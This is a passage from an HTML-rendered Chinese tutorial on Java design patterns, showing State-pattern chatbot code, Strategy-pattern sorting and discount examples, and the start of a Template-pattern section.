&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>状态模式的关键设计思想在于状态切换，我们引入一个&lt;code>BotContext&lt;/code>完成状态切换：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BotContext&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">State&lt;/span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DisconnectedState&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">chat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 收到hello切换到在线状态:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConnectedState&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">state&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 收到bye切换到离线状态:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DisconnectedState&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">state&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">state&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reply&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>聊天机器人&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">BotContext&lt;/span> &lt;span style="color:#111">bot&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BotContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bot&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">chat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isEmpty&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#d88200">&amp;#34;(no reply)&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="策略strategy">策略Strategy&lt;/h3>
&lt;p>是指，定义一组算法并把其封装到一个对象中。然后在运行时，可以灵活的使用其中的一个算法。就像把函数作为函数的参数，整体流程是确定的，但具体的细节还可以自定义&lt;/p>
&lt;p>举例：Arrays&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">InterruptedException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;apple&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Pear&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Banana&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;orange&amp;#34;&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">compareToIgnoreCase&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果我们想忽略大小写排序，就传入&lt;code>String::compareToIgnoreCase&lt;/code>，如果我们想倒序排序，就传入&lt;code>(s1, s2) -&amp;gt; -s1.compareTo(s2)&lt;/code>，这个比较两个元素大小的算法就是策略。&lt;/p>
&lt;p>举例：购物车结算&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">DiscountStrategy&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 计算折扣额度
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#75af00">getDiscount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实现各种策略，普通用户&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UserDiscountStrategy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">DiscountStrategy&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#75af00">getDiscount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 普通会员9折
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">multiply&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setScale&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">RoundingMode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">DOWN&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>满减策略如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OverDiscountStrategy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">DiscountStrategy&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#75af00">getDiscount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 满100减20优惠:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ZERO&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后应用策略需要一个&lt;code>DiscountContext&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">DiscountContext&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 持有某个策略
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">DiscountStrategy&lt;/span> &lt;span style="color:#111">strategy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">UserDiscountStrategy&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 允许客户端设置新策略
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setStrategy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DiscountStrategy&lt;/span> &lt;span style="color:#111">strategy&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">strategy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">strategy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#75af00">calculatePrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">subtract&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">strategy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDiscount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">total&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setScale&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用方必须首先创建一个DiscountContext，并指定一个策略（或者使用默认策略），即可获得折扣后的价格：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DiscountContext&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DiscountContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 默认使用普通会员折扣:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">pay1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">calculatePrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pay1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 使用满减折扣:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setStrategy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OverDiscountStrategy&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">pay2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">calculatePrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pay2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 使用Prime会员折扣:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setStrategy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PrimeDiscountStrategy&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">pay3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">calculatePrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pay3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903162006786.png" alt="image-20220903162006786">&lt;/p>
&lt;p>策略模式的核心思想是在一个计算方法中把容易变化的算法抽出来作为“策略”参数传进去，从而使得新增策略不必修改原有逻辑。&lt;/p>
&lt;h3 id="模板template">模板Template&lt;/h3>
&lt;p>emmmm 我的感觉是就像普通的面对对象的思想，充分利用接口，继承和抽象&lt;/p>
&lt;p>举例：假设我们开发了一个从数据库读取设置的类：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Setting&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
